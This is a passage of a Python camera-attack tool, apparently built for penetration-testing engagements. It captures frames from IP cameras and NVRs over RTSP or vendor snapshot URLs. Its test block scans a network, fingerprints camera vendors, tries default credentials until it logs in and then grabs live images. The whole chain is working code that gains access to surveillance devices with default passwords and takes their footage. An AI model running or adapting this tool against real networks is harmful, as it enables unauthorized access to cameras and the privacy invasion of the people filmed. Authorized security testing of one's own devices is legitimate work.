    filename = f"{ip.replace('.', '_')}_{timestamp}.jpg"
    output_path = os.path.join(artifact_dir, filename)


    # --- NVR multi-channel capture ---
    # For NVRs, query all active channels and capture one frame per channel.
    # Returns a list of capture results instead of a single dict.
    if device_type == "nvr":
        active_channels = _get_active_channels(ip, vendor, username, password)
        if not active_channels:
            print(f"[capture_frame] {ip} — no active channels found on NVR") #NORMAL
            return {
                "ip": ip,
                "status": "failed",
                "method": "snapshot",
                "artifact_path": None,
                "artifacts": []
            }

        print(f"[capture_frame] {ip} — NVR has {len(active_channels)} active channels: {active_channels}") #NORMAL
        artifacts = []

        for channel in active_channels:
            try:
                snapshot_path = get_snapshot_path_for_vendor(vendor)
                snapshot_path = snapshot_path.replace("{channel}", str(channel))
                snapshot_path = snapshot_path.replace("{username}", username)
                snapshot_path = snapshot_path.replace("{password}", password)
                if "{token}" in snapshot_path and token:
                    snapshot_path = snapshot_path.replace("{token}", token)

                url = f"http://{ip}{snapshot_path}"
                response = None
                for auth in [HTTPDigestAuth(username, password), HTTPBasicAuth(username, password)]:
                    r = requests.get(url, auth=auth, timeout=HTTP_TIMEOUT, stream=True)
                    if r.status_code == 200 and "image" in r.headers.get("Content-Type", ""):
                        response = r
                        break

                if response is None:
                    if VERBOSE: print(f"[capture_frame] {ip} ch{channel} — no image returned") #VERBOSE
                    continue

                import cv2
                import numpy as np
                from datetime import datetime
                img_array = np.frombuffer(response.content, dtype=np.uint8)
                frame = cv2.imdecode(img_array, cv2.IMREAD_COLOR)
                if frame is None:
                    if VERBOSE: print(f"[capture_frame] {ip} ch{channel} — invalid image data") #VERBOSE
                    continue

                timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
                filename = f"{ip.replace('.', '_')}_ch{channel}_{timestamp}.jpg"
                ch_output_path = os.path.join(artifact_dir, filename)
                cv2.imwrite(ch_output_path, frame)
                print(f"[capture_frame] {ip} ch{channel} — captured, saved to {ch_output_path}") #NORMAL
                artifacts.append(ch_output_path)

            except Exception as e:
                if VERBOSE: print(f"[capture_frame] {ip} ch{channel} — error: {e}") #VERBOSE
                continue

        if artifacts:
            return {
                "ip": ip,
                "status": "captured",
                "method": "snapshot",
                "artifact_path": artifacts[0],  # primary artifact for backward compat
                "artifacts": artifacts           # all channel artifacts
            }
        else:
            return {
                "ip": ip,
                "status": "failed",
                "method": "snapshot",
                "artifact_path": None,
                "artifacts": []
            }



    # --- Strategy 1: RTSP via OpenCV ---
    # Only attempt if vendor has RTSP enabled by default and we have a stream URL.
    # Build authenticated URL: rtsp://user:pass@ip:port/path
    if stream_url and is_rtsp_enabled_by_default(vendor):
        try:
            # Inject credentials into stream URL
            # stream_url format: rtsp://ip:port/path
            # authenticated format: rtsp://user:pass@ip:port/path
            auth_stream_url = stream_url.replace(
                "rtsp://", f"rtsp://{username}:{password}@"
            )

            cap = cv2.VideoCapture(auth_stream_url)
            cap.set(cv2.CAP_PROP_BUFFERSIZE, 1)  # minimize buffer, grab latest frame 
            #(without this OpenCV buffers several frames, you may get a stale frame from seconds ago instead of the current one)

            # Give the stream a moment to connect and buffer,then read frames until we get a valid one
            for FRAMES in range(10):  # try up to 10 frames max
                ret, frame = cap.read()
                if ret and frame is not None:
                    cv2.imwrite(output_path, frame)
                    cap.release()
                    print(f"[capture_frame] {ip} — RTSP capture saved to {output_path}") #NORMAL
                    return {
                        "ip": ip,
                        "status": "captured",
                        "method": "rtsp",
                        "artifact_path": output_path
                    }

            cap.release()
            if VERBOSE: print(f"[capture_frame] {ip} — RTSP returned no valid frames, trying snapshot") #VERBOSE

        except Exception as e:
            if VERBOSE: print(f"[capture_frame] {ip} — RTSP failed: {e}, trying snapshot") #VERBOSE

    # --- Strategy 2: HTTP snapshot ---
    # Used when: RTSP disabled (Reolink default), RTSP failed, or no stream_url.
    # Each vendor has a specific snapshot endpoint in vendors.py.
    try:
        snapshot_path = get_snapshot_path_for_vendor(vendor)

        # Reolink snapshot requires a session token in the URL.
        # token comes from _try_reolink_json_auth() stored in test_credentials result.
        if "{username}" in snapshot_path:
            # Reolink supports inline credentials in snapshot URL --
            # more reliable than token which can expire between auth and capture
            # For NVRs, channel is substituted per-channel in the NVR loop below
            snapshot_path = snapshot_path.replace("{username}", username)
            snapshot_path = snapshot_path.replace("{password}", password)
        elif "{token}" in snapshot_path:
            if not token:
                print(f"[capture_frame] {ip} — Reolink snapshot requires token, none provided") #NORMAL
                return {
                    "ip": ip,
                    "status": "failed",
                    "method": "snapshot",
                    "artifact_path": None
                }
            snapshot_path = snapshot_path.replace("{token}", token)


        url = f"http://{ip}{snapshot_path}"
        # print(f"[DEBUG snapshot] url: {url}")

        # Try Digest auth first, more common on cameras, fall back to Basic if Digest fails.
        response = None
        for auth in [HTTPDigestAuth(username, password), HTTPBasicAuth(username, password)]:
            r = requests.get(url, auth=auth, timeout=HTTP_TIMEOUT, stream=True)
            if r.status_code == 200 and "image" in r.headers.get("Content-Type", ""):
                response = r
                break

        if response is None:
            if VERBOSE: print(f"[capture_frame] {ip} — snapshot endpoint returned no image") #VERBOSE
            return {
                "ip": ip,
                "status": "failed",
                "method": "snapshot",
                "artifact_path": None
            }

        # Decode JPEG bytes via numpy + OpenCV so we can verify it's a valid image before saving. Avoids writing 
        # corrupted/empty files as artifacts
        img_array = np.frombuffer(response.content, dtype=np.uint8)
        frame = cv2.imdecode(img_array, cv2.IMREAD_COLOR)

        if frame is None:
            if VERBOSE: print(f"[capture_frame] {ip} — snapshot response was not a valid image") #VERBOSE
            return {
                "ip": ip,
                "status": "failed",
                "method": "snapshot",
                "artifact_path": None
            }

        cv2.imwrite(output_path, frame)
        print(f"[capture_frame] {ip} — snapshot captured, saved to {output_path}") #NORMAL
        return {
            "ip": ip,
            "status": "captured",
            "method": "snapshot",
            "artifact_path": output_path
        }

    except Exception as e:
        print(f"[capture_frame] {ip} — snapshot failed: {e}") #NORMAL

    # Both strategies failed
    return {
        "ip": ip,
        "status": "failed",
        "method": None,
        "artifact_path": None
    }







# // ------ TESTING ------ \\
#run from root, [sudo] python -m tools.real.network_tools (-m= rul file as module from current dir)
if __name__ == "__main__":
    # Step 1: scan the network
    print(" ------ STEP 1 SCANNING NETWORK ------\n")
    hosts = scan_network("")
    
    # Step 2: feed each host into grab_banner
    for host in hosts:
        
        banner_result = grab_banner(host["ip"], host["open_ports"])
        print(f" ------ STEP 2 GRABBING BANNER FOR HOST: {host["ip"]} ------\n")
        print(banner_result)

        # Combine all banner strings for vendor fingerprinting
        combined_banner = " ".join(banner_result["banners"].values())
        vendor = identify_vendor(combined_banner, host["open_ports"], host["hostname"] or "")
        print(f"[vendor] {host['ip']} → {vendor}")

        # Step 3: Check RTSP 
        print(" \t------ STEP 3 CHECKING RTSP ------")
        rtsp_ports = [p for p in host["open_ports"] if p in [554, 8554, 37778]]
        stream_url = None
        if rtsp_ports:
            for rtsp_port in rtsp_ports:
                rtsp_result = check_rtsp(host["ip"], rtsp_port, vendor)
                print(rtsp_result)
                if rtsp_result["status"] == "open":
                    stream_url = rtsp_result["stream_url"]  #RTSP URL!
                    break
        else:
            print(f"[check_rtsp] {host['ip']} — no RTSP ports open, skipping")

        #step 4: test default_creds() 
        print(" \t------ STEP 4 TESTING DEFAULT CREDS ------")
        creds = get_credentials_for_vendor(vendor)
        valid_creds = None
        token = None
        for username, password in creds:
            result = test_credentials(host["ip"], username, password, vendor)
            print(result)
            if result["status"] == "success":
                valid_creds = (username,password)
                print(f"[!] VALID CREDENTIALS FOUND: {username}:{password} on {host['ip']}")
                break  # stop testing once we have valid creds

         # Step 5: test capture frame if we have valid creds
        print(" \t------ STEP 5 TESTING CAPTURE FRAME ------")
        if valid_creds:
            username, password = valid_creds
            capture_result = capture_frame(
                ip=host["ip"],
                stream_url=stream_url,
                username=username,
                password=password,
                vendor=vendor,
                token=token,
                engagement_id="test_engagement"
            )
            print(capture_result)

    # # Direct RTSP test against local mediamtx instance
    # rtsp_result = check_rtsp("127.0.0.1", 8554, "generic_nvr")
    # print(rtsp_result)